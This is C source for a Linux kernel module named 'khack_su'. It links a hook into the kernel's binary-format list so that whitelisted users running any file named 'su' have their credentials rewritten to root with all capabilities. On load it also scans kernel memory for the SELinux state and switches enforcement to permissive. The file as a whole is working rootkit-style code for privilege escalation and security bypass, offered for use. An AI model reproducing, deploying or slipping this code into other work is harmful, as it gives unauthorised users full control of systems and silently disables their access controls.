// SPDX-License-Identifier: GPL-2.0
/* khack_su - single-module root provider (binfmt edition).
 *
 * Adds an entry to fs/exec.c:formats so that a whitelisted process
 * exec'ing a file named "su" has its bprm->cred rewritten to root before
 * the ELF loader runs.  No proc node, no call_usermodehelper, no kthread.
 *
 *   insmod khack_su.ko formats_addr=0x$(grep ' formats$' /proc/kallsyms | cut -d' ' -f1)
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/binfmts.h>
#include <linux/capability.h>
#include <linux/uaccess.h>

typedef unsigned long (*copy_fn)(void *to, const void *from, unsigned long n);

static unsigned long formats_addr;
module_param(formats_addr, ulong, 0444);
MODULE_PARM_DESC(formats_addr, "address of fs/exec.c:formats list_head");

#define KMAX_ALLOW 8
static volatile int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };

static bool uid_allowed(u32 uid)
{
	int i;

	if (uid == 0)
		return true;
	for (i = 0; i < KMAX_ALLOW; i++)
		if ((u32)*(volatile int *)&allow_uids[i] == uid && uid != 0xFFFFFFFFu)
			return true;
	return false;
}

/* ---- selinux_state scanner: flip enforcing to permissive ---- */
static int khack_clear_enforcing(void)
{
	copy_fn pkr = (copy_fn)__symbol_get("probe_kernel_read");
	unsigned long anchor = (unsigned long)__symbol_get("printk");
	unsigned long lo, hi, a, hit = 0;
	static u8 buf[4096];
	int found = 0;

	if (!pkr || !anchor)
		return -EINVAL;

	anchor &= ~0xFFFUL;
	lo = anchor - 0x800000UL;
	hi = anchor + 0x4000000UL;

	for (a = lo; a < hi; a += sizeof(buf)) {
		unsigned int i;

		if (pkr(buf, (void *)a, sizeof(buf)))
			continue;

		for (i = 0; i + 32 <= sizeof(buf); i++) {
			u8 *b = buf + i;
			u64 avc, ss;
			int j, ok = 1;

			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
				continue;
			if ((a + i) & 7)
				continue;
			for (j = 4; j < 16; j++)
				if (b[j] > 1) { ok = 0; break; }
			if (!ok)
				continue;

			memcpy(&avc, b + 16, 8);
			memcpy(&ss, b + 24, 8);
			if (avc & 7 || ss & 7)
				continue;
			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
				continue;

			found++;
			hit = a + i;
		}
	}

	if (found != 1)
		return -ENOENT;

	*(u8 *)(hit + 1) = 0;
	return 0;
}

/* ---- binfmt hook ---- */
static bool looks_like_su(const char *p)
{
	int n;

	if (!p)
		return false;
	n = strlen(p);
	if (n == 2)
		return p[0] == 's' && p[1] == 'u';
	if (n > 3 && p[n - 3] == '/' && p[n - 2] == 's' && p[n - 1] == 'u')
		return true;
	return false;
}

static bool binfmt_linked;

static int khack_load_binary(struct linux_binprm *bprm)
{
	struct cred *cred;

	if (!bprm || !bprm->filename)
		return -ENOEXEC;
	if (!looks_like_su(bprm->filename))
		return -ENOEXEC;
	if (!uid_allowed(__kuid_val(current_uid())))
		return -ENOEXEC;

	cred = bprm->cred;
	if (!cred)
		return -ENOEXEC;

	cred->uid  = GLOBAL_ROOT_UID;
	cred->gid  = GLOBAL_ROOT_GID;
	cred->suid = GLOBAL_ROOT_UID;
	cred->sgid = GLOBAL_ROOT_GID;
	cred->euid = GLOBAL_ROOT_UID;
	cred->egid = GLOBAL_ROOT_GID;
	cred->fsuid = GLOBAL_ROOT_UID;
	cred->fsgid = GLOBAL_ROOT_GID;
	memset(&cred->cap_inheritable, 0xff, sizeof(cred->cap_inheritable));
	memset(&cred->cap_permitted,   0xff, sizeof(cred->cap_permitted));
	memset(&cred->cap_effective,   0xff, sizeof(cred->cap_effective));
	memset(&cred->cap_bset,        0xff, sizeof(cred->cap_bset));
	memset(&cred->cap_ambient,     0xff, sizeof(cred->cap_ambient));

	pr_info("khack_su: grant su to uid %u (%s)\n",
		__kuid_val(current_uid()), bprm->filename);
	return -ENOEXEC;
}

static struct linux_binfmt khack_binfmt = {
	.module      = THIS_MODULE,
	.load_binary = khack_load_binary,
};

static int __init khack_init(void)
{
	struct list_head *head;

	khack_clear_enforcing();

	if (!formats_addr) {
		pr_info("khack_su: formats_addr not given\n");
		return -EINVAL;
	}

	head = (struct list_head *)formats_addr;
	INIT_LIST_HEAD(&khack_binfmt.lh);
	list_add(&khack_binfmt.lh, head);
	binfmt_linked = true;

	pr_info("khack_su: ready, binfmt linked\n");
	return 0;
}

static void __exit khack_exit(void)
{
	if (binfmt_linked)
		list_del(&khack_binfmt.lh);
}

module_init(khack_init);
module_exit(khack_exit);
MODULE_LICENSE("GPL");
